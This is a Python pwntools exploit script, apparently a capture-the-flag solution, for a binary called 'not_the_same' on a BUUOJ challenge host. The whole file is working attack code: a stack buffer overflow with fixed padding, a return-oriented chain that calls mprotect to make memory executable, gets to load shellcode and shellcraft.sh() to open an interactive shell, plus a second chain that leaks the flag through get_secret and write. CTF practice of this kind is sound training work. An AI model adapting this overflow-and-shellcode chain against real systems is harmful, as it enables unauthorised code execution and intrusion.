from pwn import *
context.arch = 'i386'

# p = process('./not_the_same')
p = remote('node3.buuoj.cn',27317)
elf = ELF('./not_the_same')

def exp1(p,elf):
	shellcode_addr = 0x080EA000
	payload = 0x2d*'A' 	# the padding need to debug
	payload += flat([elf.sym['mprotect'], elf.sym['main'], shellcode_addr, 0x80, 0x7])
	p.sendline(payload)
	# change the policy of shellcode_addr, and write shellcode to execve
	payload = 0x2d*'A'
	payload += flat([elf.sym['gets'], shellcode_addr, shellcode_addr])
	# after get shellcode to shellcode_addr, return to shellcode_addr and execve the shellcode
	p.sendline(payload)
	sleep(1)
	p.sendline(asm(shellcraft.sh()))
	sleep(1)
	p.interactive()

def exp2(p,elf):
	# when debug locally, exp2 is not effectively
	fl4g = 0x080ECA2D
	payload = 'A'*0x2d
	payload += flat([elf.sym['get_secret'], elf.sym['write'], elf.sym['main'], 0, fl4g, 50])
	# execve function get_secret, and print the flag by function write
	p.sendline(payload)
	sleep(1)
	print p.recv()

res = input('exp1(f) or exp2(s): ')
if res == 'f':
	exp1(p,elf)
elif res == 's':
	exp2(p,elf)
else:
	print "Wrong input!"
